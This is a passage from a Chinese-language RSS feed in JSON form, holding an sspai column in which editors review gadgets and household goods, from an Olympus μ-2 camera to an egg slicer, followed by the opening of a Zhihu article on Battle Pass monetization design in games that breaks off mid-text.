href=\"http://www.zhihu.com/question/309704164?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">你能接受中国要有归化球员吗？</a><br><a href=\"http://www.zhihu.com/question/267112127?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么感觉在奥运会中，中国一直被针对，冬奥会也这样。。。。。？</a><br>\n","link":"http://www.zhihu.com/question/514069482/answer/2342673838?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"新玩意 093｜少数派的编辑们最近买了啥？","date":"2022-02-10 09:29:09","description":"\n<h4>关于栏目</h4>\n<p>很多读者都会好奇少数派的编辑们到底平时都「买了啥」。我们希望通过「编辑部的新玩意」介绍编辑部成员们最近在用的新奇产品，让他们自己来谈谈这些新玩意的使用体验究竟如何。</p>\n<p>内容声明：《新玩意》栏目如含有商务内容，将会在对应条目标注「广告」；来源为「厂商送测」的产品并无内容干涉。</p>\n<hr>\n<h2>@Tp：多合一读卡器</h2>\n<ul>\n<li>入手渠道：淘宝自购</li>\n<li>入手价格：¥58</li>\n</ul>\n<p>自从年初购入相机后，照片的传输就成了一个大问题。我本来不想专门买个读卡器来传输照片，因为单个读卡器很难满足我同时连接电脑、iPad 和 iPhone 的需求。奈何富士的照片传输 App 不够好用，连接、传输速度都很难让人满意。终于有一天，我在淘宝上看到了这个多合一读卡器，正好可以满足多设备连接的需求。</p>\n<p>这个读卡器有 USB A、USB C 和 Lightning 三个插口，同时支持读取 SD 卡和 microSD 卡。店家提供了 USB 2.0 和 3.0 两种款式，因为我几乎没有使用 USB A 的场景，所以果断买了更便宜的 2.0 版本。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c82c9alb34taavnbbi50.jpeg\"></figure><p>在实际体验中，照片传输速度还是令人满意的<s>，至少比 App 传输快多了</s>。接口的盖子采用了磁吸式安装，开合很方便，平时没事的时候我还会拿在手里把玩。读卡器体积不算特别大，出门揣包里就可以随时随地把照片导入到手机修图。</p>\n<p>不过，这个读卡器的插拔卡体验需要适应一番。插卡的反馈并不明显，有时候感觉阻尼很大了，但其实没有推压到底，设备无法读取。因为预留的空间较小，拔卡的时候也会比较抠手。考虑到它并不算高的售价，以及「够用」的体验，这个读卡器还算是物有所值的。</p>\n<h2>@张奕源 Nick：Olympus μ-2 相机</h2>\n<ul>\n<li>入手渠道：淘宝自购</li>\n<li>入手价格：约 2300 元</li>\n</ul>\n<p>春节之前，我想买一部可以和黛西一起用的胶片相机。考虑到黛西对手动相机不感冒，所以只能在全自动对焦的 PS 机中选择。我把自己收藏的相机店铺翻了翻，发现一部成色接近全新的 Olympus μ-2，于是果断决定「就是它了」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c82c9b5b34taavnbbi5g.jpeg\"></figure><p>μ 系列是 Olymups 旗下的紧凑型相机产品线，除了命名只包含 μ 字样的定焦产品外，还有名称中带着 ZOOM 的变焦机种。进入数码时代后，μ 系列也推出了近 20 款产品，可谓「人丁兴旺」，家族庞大。</p>\n<p>Olympus μ-2 则是该系列中最经典的一款，于 1997 年发布。μ-2 的外形设计简洁，尺寸只有大约一部 iPhone 4 的大小，随身携带相当方便。相机的一侧采用了和跑车类似的弧线，整体则为淡雅的香槟金。为了控制这部相机的重量，μ-2 的外壳完全使用塑料材质，但在合理的设计和色彩搭配之下也不显得廉价，反而会让人产生「这东西可不便宜吧」的错觉。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c82c9b5b34ta98875ifg.jpeg\"></figure><p>Olympus μ-2 拥有生活防水能力，机器上贴着「All weather」的蓝色标识。我买到的这部 μ-2 除了成色极新之外，还是一部有点特别的「中国大陆版」——整机零件由日本生产并在中国组装，机身背面还贴着九〇年代进口商品上常见的「中华人民共和国」镭射标志，连包装盒上都印着中文的产品信息。年轻的朋友们应该都没见过这个独特的镭射标，它是上世纪独有的历史痕迹。鉴于这一点点纪念意义，我没有将这个标志撕掉。平时把相机拿在手里，还能看到天安门、五颗星以及中国字样闪烁其间，很有意思。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c82c9blb34ta98875ig0.jpeg\"></figure><p>Olympus μ-2 使用了一颗最大光圈为 ƒ2.8 的 35 mm 定焦镜头，光学素质极其出色，35 mm 的焦段也是我日常使用最高频的焦段之一。拉开 μ-2 的镜头盖后，相机就会自动开机，观景框内也会以框线的形式提示实际取景区域。μ-2 配备有 Olympus 当时最先进的 Multi-AF 自动对焦系统，闪光灯区域下方能隐约看到这套自动对焦机构。实际使用中，μ-2 的对焦十分迅速，而且得益于这套对焦系统的存在，即使面对一些相对复杂的场景，μ-2 也能很好地分辨对焦主体。</p>\n<p>拍摄时，半按快门即可对焦，观景框右侧会有绿色的小圆点，提示对焦准确可以拍摄。如果对焦距离太近或者无法完成对焦，绿色小圆点会不断闪烁，快门也无法按下。绿色小圆点上方则是橙色小圆点，光线不足时会亮起，提示相机会自动开启闪光灯。</p>\n<p>μ-2 背面只有两个主要功能按键，左侧按键用于调整闪光灯模式，右侧按键则用来开启定时拍摄或遥控拍摄模式。日常拍摄时，电子萤幕会显示当前拍摄张数和相机模式。萤幕右侧两个小按键用于调整照片时间戳，我平时完全不用；下方的小圆点则用于手动回片。最右侧的透明小框里刚好能看到胶卷的基本信息，十分贴心。</p>\n<p>μ-2 的观景框很小，取景时如果眼睛不能与观景框保持垂直，视线就很容易被周围遮挡，看不到对焦小绿点的状态。好在 μ-2 的对焦系统非常可靠，很多时候即使看不到小绿点，我也会放心地按下快门，不担心对焦问题。</p>\n<p>在入手 Olympus μ-2 之后，不喜欢用相机拍照的黛西也拿着它很开心地拍了两卷，而且只用几分钟就学会了基本操作，足见 μ-2 作为「家庭日常拍摄工具」的定位之成功。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c82c9btb34taavnbbi60.jpeg\"><figcaption>黛西用 μ-2 拍的第一个胶卷，出手就是大师</figcaption></figure><p>在千元档的价位上，还有着大量便宜且好用的 PS 相机，它们都拥有靓丽的外形以及很适合新年送礼或者平时自用，喜欢摄影的朋友们可以搞一部试一试，说不定能帮你重新找到拍照的乐趣。</p>\n<h2>@北鸮：Cherry G84-4100</h2>\n<ul>\n<li>入手渠道：闲鱼二手</li>\n<li>入手价格：60 元</li>\n</ul>\n<p>因为一次说走就走的周末出行，我躲过了家里爆发的疫情，成功被困在外地的朋友家里，并且拖着他和我一起居家隔离两周。没成想这一呆就是一个月，等到疫情结束，封锁解除，年都过完了。很显然，原本打算周末就回家的我并没有带上足够的工作必需品。在发现自己基本无法离开之后，我决定买一把键盘，好用上朋友已经干坏了键盘的笔记本电脑凑合着工作。</p>\n<p>（有一些朋友读到这里可能就已经觉得这人没救了。更没救的是我其实买了两把。）</p>\n<p>这把键盘自然不能太贵，同时我也希望它轻薄一点，一方面是更容易架在狭小的临时办公点，另一方面是更好塞包里带回家。在扫了一遍闲鱼之后，我决定花 60 块钱买一把被淘汰很多年的 Cherry G84-4100 USB，这把键盘原先我只见到过工业版和早期的非 Windows 适配版，头回看见原生 USB+Windows 的后期版本，觉得也是时候尝尝这把几十年前的老鲜。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c82c9c5b34taavnbbi6g.jpeg\"></figure><p>至于尝鲜的结果，开门见山地说，G84-4100 不是一把好键盘。我只能将其视为 Cherry 在便携键盘做出的一次尝试，但单纯就功能性而言，它是有趣的，值得一玩，能用就可以了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c82c9cdb34ta98875igg.jpeg\"></figure><p>G84 系列的键盘搭载的是 Cherry ML 轴，轴心卯眼是两个方洞，被称为「猪鼻子」轴，后续凯华、佳达隆等厂商的矮轴也采用了这样的设计。这是一款不够优秀的矮轴，以至于 Cherry 自家都产出了适用性更好的 MX Low Profile（虽然还是很拉胯）。不过还是有其他厂商采购 ML 轴体，比如 Kinesis Advantage 2 这把人体工学键盘，F 区矮矮的功能键就是 ML 轴。它只有一种手感，就是类似茶轴的小段落，按下时有一个不大不小的回馈，压力克数大约 50 g。和常见的 MX 轴体相比，由于轴心呈长方形，且模具较为粗糙，当从单个按键的边角按压时，按键阻力会急剧上升，非常卡涩。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c82c9cdb34ta9bscqh4g.jpeg\"><figcaption>一马平川的键帽，让背后的可调节支架失去了意义</figcaption></figure><p>但由于 G84-4100 的整体设计更偏向于便携，它在大力压缩键盘尺寸的同时附上了几乎同一高度、毫无人体工学设计的键帽，甚至出现了 0.9u 这种奇怪长度的压缩按键，像是把笔记本键盘直接抠了出来。这种比一般 MX 轴键帽更局促的打击面积反而限制了手指从边角按下。而且 ML 轴作为矮轴行程很短，哪怕按偏了，一个大力也就下去了，反而比特别卡涩的全高轴体验要好些，算是歪打正着地进入了「也不是不能用」的级别。就是键帽做工非常差劲，注塑水口十分明显，还好打字的角度注意不到。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c82c9clb34ta98875ih0.jpeg\"><figcaption>注塑水口，非常大，甚至剌手</figcaption></figure><p>键盘虽小，但 Cherry 想尽办法把所有按键都以组合键的方式塞了进来，甚至包括数字小键盘。但这块键盘的实际体验并不美好，符号的安排和一般键盘相去甚远。这也是后续我又买了一把二手键盘的原因：你几乎没办法在这把键盘上适应到盲打，它的符号布局和现代键盘差得太远了，并且不像客制化那样可以自定义。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c82c9ctb34taatkrlfpg.jpeg\"><figcaption>神一样的 0.9u 功能键和奇怪的布局</figcaption></figure><p>总之，如果你真的想玩玩这种便携老键盘，或许可以体验一下，反正 60 块钱也不贵，而且不是不能用，打打字还是扛得住的。但是，如果你真的想买一把矮轴键盘来好好日用，我建议你还是即刻前往 <a href=\"https://item.taobao.com/item.htm?spm=a230r.1.14.11.26f460d1ve7wDg&amp;id=659882481679&amp;ns=1&amp;abbucket=12#detail\" target=\"_blank\">少数派商店</a> 购买 sspai x Keychron K3 矮轴键盘，这是我用到现在觉得最好的矮轴键盘了，还是蓝牙双模，我当时出门要是带了 K3，早就不存在买键盘的问题了。</p>\n<h2>@Clyde：蔡司防雾清洁湿巾</h2>\n<ul>\n<li>入手渠道：京东</li>\n<li>入手价格：54 元/30 片</li>\n</ul>\n<p>春节逛街时在眼镜店的一次意外消费，让轻度近视、中度散光的我时隔多年又戴上了框架眼镜。距离上次佩戴眼镜已经过去了好多年，适应起来挺快，唯一的不便源于近年来上街必备的口罩——在地铁里满眼都是因为呼吸而盖上的雾气，原本清晰的世界很快又进入了迷幻模式。</p>\n<p>找了一段时间解决方案，最后在浏览 Matrix 作者推荐的 <a href=\"https://sspai.com/post/59635\" target=\"_blank\">蔡司清洁消毒湿巾</a> 时看到了他家新出的防雾清洁湿巾。心想既然价格不贵，那就买来试一试吧，如果可以也能推荐给家里同样戴眼镜的亲友。</p>\n<p>先说结论：<strong>有用，但也会带来别的烦恼</strong>。</p>\n<p>从包装看，这款防雾清洁湿巾的主要成分包括醇类化合物、去离子水和木质纸浆，打开后能够闻到比较明显的酒精味，但产品宣传页面中注明了并不会伤害镀膜，考虑到蔡司本身算是行业内的专业厂商，这方面我倒没有太多担心。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c82c9ddb34taatkrlfq0.png\"></figure><p>一包湿巾的尺寸并不算大，而且有效成分的蒸发速度挺快，实际使用时如果镜片面积较大，擦拭到第二块镜片时就会感觉比较干涩；使用后需要静置一两分钟时间，镜片上会留下能够肉眼仔细观察到的擦拭痕迹，虽然并不明显、戴上后也不会影响实际观感，但仔细看还是会觉得心理上有些不适。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c82c9dlb34ta98875ihg.png\"></figure><p>不过擦拭之后镜片的确具备了神奇的防雾效果。戴着口罩和眼镜坐地铁、吃热腾腾的饭菜，都不会因为雾气而影响视野，幸福感还是挺强的；一次擦拭之后据说能够坚持 3 天左右，但如果是高强度使用下来，比如每天上下班长时间在地铁上，那么第二天眼镜镜片上就会出现油状的彩色斑纹，推测是防雾成分在水汽稀释后产生的。这时就得使用第二片了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c82c9dtb34taatkrlfqg.png\"></figure><p>总体而言，因为使用防雾清洁湿巾后眼镜表面就变得油腻腻的，很难借助眼镜布进行完全清洁，即便不影响观感，我也不会在日常生活中长期使用这款产品——除非我想在地铁上玩手机。</p>\n<h2>@Lotta：手动切蛋器</h2>\n<ul>\n<li>入手渠道：淘宝</li>\n<li>参考价格：5 元</li>\n</ul>\n<p>看到首页文章《<a href=\"https://sspai.com/post/70973\" target=\"_blank\">这些好用小物件，让厨房生活更方便</a>》里面提到的蒸蛋器，我突然想起之前为了凑单而加入购物车、却意外好用的手动切蛋器。因为价格便宜，对它也没抱什么期待，甚至持有一丝怀疑态度，只用几根细线来分割紧实饱满 Q 弹的煮鸡蛋真的可以吗？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c82c9e5b34taavnbbi70.jpeg\"></figure><p>切蛋器主体是白色塑料材质，细线则是不锈钢材质，整体很轻，可以很平稳地放置在桌面上。有两种切法，左边圆形的分割器可以切六瓣，右边可以切片。顶端有孔设计，可以挂在墙上，切瓣那一侧的铁丝虽然没有固定，但也没那么容易掉下来。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c82c9elb34taatkrlfr0.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c82c9etb34ta9bscqh50.jpeg\" alt=\"\"></figure><p>使用时只需要把剥好的煮鸡蛋放在凹槽内，凹槽的设计刚好可以容纳一个鸡蛋，放上去后鸡蛋也不会滚来滚去。如果担心切割时会滑落，可以用另一只手扶着，然后手起线落，切割起来非常顺滑，毫不费力。切面是否整齐，则取决于切下的速度和蛋黄的熟度。如果蛋黄煮得较老，就难免会在切的过程中附着在钢丝上，切完后只需要用清水冲洗，就会恢复如初，目前使用下来也没有划伤手的风险。不锈钢的材质也不用太担心生锈，不过考虑到 5 元的价格，即使生锈了再换一个成本也不算高。</p>\n<p>总体而言，这个便宜好用的切蛋器很适合偶尔想尝试新菜式、漂亮摆盘、刀工又相当于没有的朋友（bushi。即使是对于拥有优秀刀工的朋友，它也是一个能帮你节省时间的厨房小工具。</p>\n<h2>@老麦：只轻植萃洗发水</h2>\n<ul>\n<li>入手渠道：<a href=\"https://item.jd.com/10035980460115.html\" target=\"_blank\">京东购买</a>\n</li>\n<li>价格：两件八折 合 94元/330ml</li>\n</ul>\n<p>说起洗发水这个事，不知不觉也过了三个阶段，早年基本都是用宝洁系产品，一方面它们家的广告代言狂轰滥炸，相信大品牌也不会坑人，海飞丝飘柔加沙宣，满脑子都是飘逸的画面，但我是严重的油性发质，他们的产品用完之后，基本也就一两个小时的顺滑，到下午就油的不行了，毕竟都是硅油的功劳。</p>\n<p>第二个阶段是迷信进口产品，住在深圳去香港方便，所以经常会带一些进口产品，什么马油、惠润，总觉得日本的产品更靠谱，用起来感觉是比宝洁系强一些，但一段时间后就觉得不对劲，又去尝试其他牌子，最后搞不清哪个最实用了。</p>\n<p>第三个阶段是尝试国产新消费品牌，第一次尝试还是通过老罗直播买的植观蓬松洗发水，主打氨基酸成分，实际体验还不错，确实能降低油腻感，保持蓬松。后来，朋友又推荐了更小众的只轻植萃洗发水，转眼用了大半年了，感觉针对性更强，值得说说。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c82c9fdb34ta98875ii0.png\"></figure><p>后来我详细了解才知道，只轻这个小品牌，配方上还是很下功夫的，除了不添加硅油，还包含很多侧柏、山茶的提取物，所以味道上就是偏松树的清香味，对于男士来说，避免一些奇奇怪怪的妖艳味道。每次用量很少，就可以产生大量泡沫，泡沫很细腻，能渗透到头皮，一次就洗到位，所以 330ml 可以用几个月。虽然官方宣传了很多关于成分的专利，包括一定的防脱精油成分，我开始也没怎么在意，但第一瓶用完之后，我换了以前用的进口产品，差距立刻就显现了，用只轻的阶段，确实在头油控制，头屑，掉发方面，都比其他洗发水更好。</p>\n<p>这个产品定位很明确，专门针对油性发质的男士用户定制，如果你也是这种情况，可以尝试一下。干性发质肯定越用越干，不建议使用，看到两条京东差评估计就是这个问题。另外，可能是药物成分或弱酸性的原因，洗完之后头皮会有一点轻微刺激感，可能因人而异。</p>\n<p>回想起来，新消费浪潮确实让很多日用消费品产生了本质的改变，但也有很多被资本裹挟，重营销轻产品伪品牌，希望那些真正从需求出发，专注产品品质的品牌能好好活下去。</p>\n<hr>\n<p><strong>如果你也想分享「新玩意」🔉：</strong></p>\n<ul>\n<li>获取 Matrix 社区写作权限并签署 <a href=\"https://sspai.com/post/57192\" target=\"_blank\">Matrix 共创计划 </a>；</li>\n<li>新发布一篇文章，在标题中标注「新玩意」前缀；</li>\n<li>用至少 800 字介绍产品，并配上 2-3 张产品的实拍图片；</li>\n<li><strong>在网站个人信息中补充支付宝账号。</strong></li>\n</ul>\n<p>成功入选本栏目还可以得到 108 元的「剁手红包」🧧。如果你有兴趣参与，就赶紧来稿吧！</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更多的新玩意 🆒</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/?spm=a230r.7195193.1997079397.2.2ddc7e0bPqKQHc\">少数派 sspai 官方店铺 </a>🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71361"},{"title":"游戏商业化的又一重大创新——详解Battle Pass","date":"2022-02-09 07:44:52","description":"\n<h2>目录大纲</h2>\n<p data-pid=\"8FbVlztZ\"><b>1.导言</b></p>\n<p data-pid=\"RXyQhqfr\">简单阐述游戏商业化的定义，以及介绍本文的主要内容</p>\n<p data-pid=\"7UFsanmq\"><b>2.什么是Battle Pass</b></p>\n<p data-pid=\"FpRK-tdz\">介绍Battle Pass的定义，以及它的起源、目前的发展</p>\n<p data-pid=\"BI_6lWJJ\"><b>3.Battle Pass的设计</b></p>\n<p data-pid=\"ea9wSLux\">运用游戏商业化系统的常见设计逻辑对Battle Pass进行分析</p>\n<p data-pid=\"0TiebOEf\"><b>3.1.Battle Pass的设计优点</b></p>\n<p data-pid=\"7MbM2pCj\"><b>3.2.Battle Pass的设计架构</b></p>\n<p data-pid=\"9wDu28Lq\"><b>3.2.1.Battle Pass的付费设计</b></p>\n<p data-pid=\"nQx0ml6k\"><b>3.2.2.Battle Pass的活跃设计</b></p>\n<p data-pid=\"A9IYEJ4q\"><b>3.2.3.Battle Pass的产出设计</b></p>\n<p data-pid=\"Dxq5q49g\"><b>4.总结</b></p>\n<hr>\n<h2>1.导言</h2>\n<p data-pid=\"W1u3f7um\">游戏商业化，在游戏市场和游戏行业一直是不少游戏策划和运营人员研究和思考的问题。</p>\n<p data-pid=\"6F_iR74k\">游戏类型和用户人群的不同，往往决定了其采取的商业化体系不同，也造就了游戏商业化的多样性。</p>\n<p data-pid=\"MqYCHR38\">但其实随着行业的发展和行业前辈的摸索、推进，网络游戏的商业化已经是非常成熟的一套体系了。</p>\n<p data-pid=\"SOiYYExn\">什么是游戏的商业化？</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-1c6897b11a628411f5fc060ea849bf88_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"375\" data-rawheight=\"225\" class=\"content_image\" width=\"375\"></figure><p data-pid=\"3tsk5nfe\">就是将游戏内容通过一定的商业化活动和商业化手段，售卖给游戏用户的行为。</p>\n<p data-pid=\"S2zcKah4\">像6元首充、投资理财、节日限时活动等等都是游戏商业化的具象。</p>\n<p data-pid=\"-dOhtHB5\">也正是因为这一套体系已经日趋成熟，加上市场泛用性较强，所以我们不难发现，很多新上市的游戏，其商业化体系几乎都是一样的套路。</p>\n<p data-pid=\"WACHpmSd\">在这里我不讨论游戏商业化的合理性和必要性之类的内容。</p>\n<p data-pid=\"CAyy9umU\">本文主要是探究网络游戏商业化设计的又一个重大创举——Battle Pass，即战斗通行证。</p>\n<p data-pid=\"Irpdm7ER\">主要通过细致讲解Battle Pass的设计细节，探究其设计逻辑和可供我们游戏策划借鉴的点。</p>\n<p data-pid=\"kq1y3R_k\">也希望能通过对这一个商业化系统的剖析，细致阐述游戏商业化系统的设计逻辑，即用户参与、用户行为、用户需求三个核心点。</p>\n<p data-pid=\"fjchKCX4\">希望能对初入行或者想了解这一块内容的小伙伴起到一定的帮助。</p>\n<h2><b>2.什么是Battle Pass</b></h2>\n<p data-pid=\"MLkU3eKe\">先解释一下什么是Battle Pass。</p>\n<p data-pid=\"1d3eN8rj\">所谓Battle Pass（又称“战斗通行证”），指的是游戏内一个依托于一定时间周期的玩法、包含活跃设计和付费设计的商业化系统。</p>\n<p data-pid=\"6P5MTKds\">它的原型是V社2013年在旗下《DOTA2》推出的The International Interactive Compendium Bundle（通常译为“TI3互动观赛指南”，玩家俗称为“小绿本”）。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-3c6d65fae0873529d0da6adb06cfd7b7_b.jpg\" data-size=\"normal\" data-rawwidth=\"500\" data-rawheight=\"374\" class=\"origin_image zh-lightbox-thumb\" width=\"500\" data-original=\"https://pic4.zhimg.com/v2-3c6d65fae0873529d0da6adb06cfd7b7_r.jpg\"><figcaption>当年的“小绿本”</figcaption></figure><p data-pid=\"cIPNkwm_\">这个小绿本围绕TI3国际邀请赛，做了付费内容的设计。</p>\n<p data-pid=\"aWrEhusu\">它可以当成一张高级门票，售价为9.99美元（线上观看无需实际门票），拥有比赛预测、获取选手卡片、观赛过程获得额外奖品等功能。</p>\n<p data-pid=\"Jp-L5NNB\">其次，购买小绿本时会获得一只信使，这只信使可以通过完成指定的挑战进行升级，解锁皮肤等外观内容。</p>\n<p data-pid=\"XgRs1xwd\">之后，V社在T4“小紫本”中加入了等级积分系统，完成挑战获得积分，积分用来提升等级解锁奖励。</p>\n<p data-pid=\"RzzJmKGy\">TI5的“小金本”加入了互动指南加50级的高级版本，以及掉落金币护符用于彩票抽奖。</p>\n<p data-pid=\"YgOGCbZ0\">TI6的“小红本”改名叫做Battle Pass（当时翻译为勇士令状，这也是Battle Pass这个名称的由来），并且直接加入了一个轮盘彩票到小本子当中。</p>\n<p data-pid=\"4UfdYNTU\">从以上的设计可以看出，V社的很多设计已经具备了一些现在战斗通行证的特征。但还不是完全的战斗通行证。</p>\n<p data-pid=\"F6f7iftN\">真正意义上的战斗通行证，业内公认是Epic Games旗下的《Fortnite》（国内译为《堡垒之夜》）首先推出的。</p>\n<p data-pid=\"ddSgIxP4\">一推出就获得巨大成功，全年收入24亿美金，高达70%的付费率（官方数据）。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-b1dbde9848104211d33d9fcfa80673a4_b.jpg\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic1.zhimg.com/v2-b1dbde9848104211d33d9fcfa80673a4_r.jpg\"><figcaption>《堡垒之夜》借助Battle Pass赚得盆满钵满</figcaption></figure><p data-pid=\"7EIY0G_H\">随后蓝洞旗下的《绝地求生》立马跟进，上线了战斗通行证后同样效果显著，实现了活跃和付费的双增长。</p>\n<p data-pid=\"BxFnZJsv\">再之后，这股风潮蔓延到MOBA类游戏，《王者荣耀》、《平安京》相继推出；</p>\n<p data-pid=\"BXuCd68A\">再之后，MMORPG品类如《楚留香OL》以及最近出的《龙族幻想》也都上了战斗通行证；</p>\n<p data-pid=\"2FY8SD9k\">最后，诸如《皇室战争》、换皮的页转手等等也凑了上来……</p>\n<p data-pid=\"Tdtd8Jpr\">至此，这股风潮在圈内已经蔓延开，不同品类的游戏和游戏策划们也都在计划如何根据自身游戏特点来借鉴化用。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-84cca9e6c3993bc7c609d995c54d0307_b.jpg\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1536\" class=\"origin_image zh-lightbox-thumb\" width=\"2048\" data-original=\"https://pic4.zhimg.com/v2-84cca9e6c3993bc7c609d995c54d0307_r.jpg\"><figcaption>不久前上市的《龙族幻想》就搭载了这个商业化系统</figcaption></figure><h2>\n<b>3.</b>Battle Pass<b>的设计</b>\n</h2>\n<p data-pid=\"VhzJY2ji\">Battle Pass从表面上来看，是一个小额付费+活跃设计的组合型商业性系统，显得好像和已有的商业性系统没什么区别。</p>\n<p data-pid=\"XnhKJ6H7\">落实到玩家体验上来说，就是用小额付费+大量活跃去“买”原本小额付费无法买到的东西。</p>\n<p data-pid=\"8JkTP8nl\">举个简单的例子，假设我要产出的这个皮肤我定价为300块。</p>\n<p data-pid=\"IYHLia5e\">一般情况下，再怎么降价也不可能让你38块买到。</p>\n<p data-pid=\"rQHOioyH\">但是，我告诉你只要花38块买了Battle Pass，每天保证一定的活跃，我就送你这套价值300块的皮肤，而且还有其他更多的道具奖励。</p>\n<p data-pid=\"AN_S3efy\">只要你是这个游戏的玩家，没理由不动心的。</p>\n<p data-pid=\"fPTnfiJ1\">所以，<b>Battle Pass的本质</b>就是让玩家用小额的金钱和大额的时间来获取原本应大额金钱获取的游戏内容。</p>\n<p data-pid=\"jtYWM0h9\">这也侧面佐证了张靓颖说的那句“你的时间非常值钱”是游戏行业公认的定律。</p>\n<p data-pid=\"nCx1ZhIj\"><b>3.1.Battle Pass的设计优点</b></p>\n<p data-pid=\"gc-_a4fX\">Battle Pass的设计优点是和它本身的特性分不开的。</p>\n<p data-pid=\"eFmIwGpy\">前文我也提到了Battle Pass的两个特性，即依托一定时间周期的玩法、含有活跃设计和付费设计。</p>\n<p data-pid=\"ofrNMLCi\">这也造就了在我眼中，Battle Pass的三个优点：</p>\n<p data-pid=\"ST3_GCXJ\">（1）极低的用户参与门槛，兼顾免费用户和付费用户的差异化服务和游戏体验；</p>\n<p data-pid=\"2W664Yub\">（2）良效地引导用户行为，拉动游戏活跃数据和付费数据的双增长；</p>\n<p data-pid=\"l85WjvcX\">（3）极大地满足用户需求，实现游戏口碑改善和用户满意度提升的协调发展。</p>\n<p data-pid=\"qYoAAs3X\">觉得太高度概括？没事，看完下面的设计架构分析，你就能明白了。</p>\n<p data-pid=\"21eh7072\"><b>3.2.Battle Pass的设计架构</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-7271606fa3a28c4a416280a655d6649e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"979\" data-rawheight=\"321\" class=\"origin_image zh-lightbox-thumb\" width=\"979\" data-original=\"https://pic3.zhimg.com/v2-7271606fa3a28c4a416280a655d6649e_r.jpg\"></figure><p data-pid=\"rgmd2Krc\">Battle Pass的设计架构，我个人拆分为<b>付费设计</b>、<b>活跃设计</b>以及<b>产出设计</b>这三大块内容。</p>\n<p data-pid=\"QPiwnpb_\">而这三大块内容都直接关联到了用户也就是玩家本身。如：</p>\n<p data-pid=\"BvLwiesU\">付费设计关联用户参与；</p>\n<p data-pid=\"rESe7sBv\">活跃设计关联用户行为；</p>\n<p data-pid=\"QPau8qWm\">产出设计关联用户需求。</p>\n<p data-pid=\"qWY-x0hp\">所以说，仔细剖析，Battle Pass的设计究其逻辑也是遵循了常见游戏商业化系统的设计要点，即<b>注重用户参与</b>，<b>引导用户行为</b>，<b>满足用户需求</b>这三个核心点。</p>\n<p data-pid=\"BH4WbCmB\"><b>3.2.1.Battle Pass的付费设计</b></p>\n<p data-pid=\"Tb1pwp27\">首先说<b>付费设计</b>。通常分为三个档次，0元付费即免费、68元付费、128元付费（各个游戏根据自身游戏类型、用户付费能力等因素都会具体不同，但基本为三个档次）。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-6f1bff049e8a106ede74ddbaf4e81b52_b.jpg\" data-size=\"normal\" data-rawwidth=\"1412\" data-rawheight=\"740\" class=\"origin_image zh-lightbox-thumb\" width=\"1412\" data-original=\"https://pic3.zhimg.com/v2-6f1bff049e8a106ede74ddbaf4e81b52_r.jpg\"><figcaption>《决战！平安京》的赏金特典就是典型的三档次区别</figcaption></figure><p data-pid=\"3zhgeVR0\">每个档次的玩家，所能体验的内容是不同的（这一块内容我在后面的产出设计来讲）。</p>\n<p data-pid=\"vG412Zwq\">设置不同档次的原因是显而易见的，最大的核心点就是<b>强调用户参与</b>。</p>\n<p data-pid=\"XyUDffbA\">（这里额外提一嘴，强调用户参与不是广义上的要让更多数量的用户去参与，这块内容受不少因素影响，后面如果有机会我会更深一步阐述解释。）</p>\n<p data-pid=\"6H2dYzYi\"><b>设置0元付费档次</b>，是为了让不付费的玩家也能参与进来，而不是将他们拒之门外。</p>\n<p data-pid=\"VnucKh0W\">对于他们来说，Battle Pass是一个只用付出活跃就能拿道具的福利系统。</p>\n<p data-pid=\"-M42dFrT\"><b>设置68元付费档次</b>和<b>128元付费档次</b>，则主要是为了游戏营收，只是会发放更为丰厚的奖励来作为吸引的手段。</p>\n<p 